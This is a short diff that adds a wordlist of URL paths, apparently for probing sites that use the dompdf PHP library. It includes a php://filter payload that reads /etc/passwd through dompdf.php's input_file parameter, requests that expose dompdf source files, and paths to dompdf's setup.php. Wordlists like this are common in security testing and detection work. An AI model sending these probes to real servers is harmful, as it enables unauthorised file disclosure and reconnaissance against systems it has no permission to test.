@@ -1,0 +1,11 @@
+/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
+/dompdf.php?input_file=dompdf.php
+/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=dompdf.php
+/lib/dompdf/dompdf.php?input_file=dompdf.php
+/includes/dompdf/dompdf.php?input_file=dompdf.php
+/www/setup.php
+/dompdf/dompdf/www/setup.php
+/js/dompdf/www/setup.php
+/portal/application/libraries/dompdf/www/setup.php
+/sites/all/libraries/dompdf/www/setup.php
+/vendor/dompdf/dompdf/www/setup.php
